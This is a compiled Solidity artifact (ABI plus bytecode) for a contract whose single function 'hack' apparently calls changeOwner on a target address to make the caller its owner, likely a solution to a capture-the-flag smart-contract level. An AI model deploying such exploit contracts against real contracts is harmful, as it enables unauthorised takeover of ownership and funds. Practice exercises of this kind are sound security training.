{"abi":[{"type":"function","name":"hack","inputs":[{"name":"_instance","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506101248061001c5f395ff3fe6080604052348015600e575f5ffd5b50600436106026575f3560e01c80636c4c174f14602a575b5f5ffd5b6039603536600460b6565b603b565b005b6040517fa6f9dae100000000000000000000000000000000000000000000000000000000815233600482015273ffffffffffffffffffffffffffffffffffffffff82169063a6f9dae1906024015f604051808303815f87803b158015609e575f5ffd5b505af115801560af573d5f5f3e3d5ffd5b5050505050565b5f6020828403121560c5575f5ffd5b813573ffffffffffffffffffffffffffffffffffffffff8116811460e7575f5ffd5b939250505056fea2646970667358221220339edf08bd7dcd5d59b2519feca71f30fed0424c9565dd1ac54b8fef7e2a948f64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"hack(address)":"6c4c174f"},"id":0}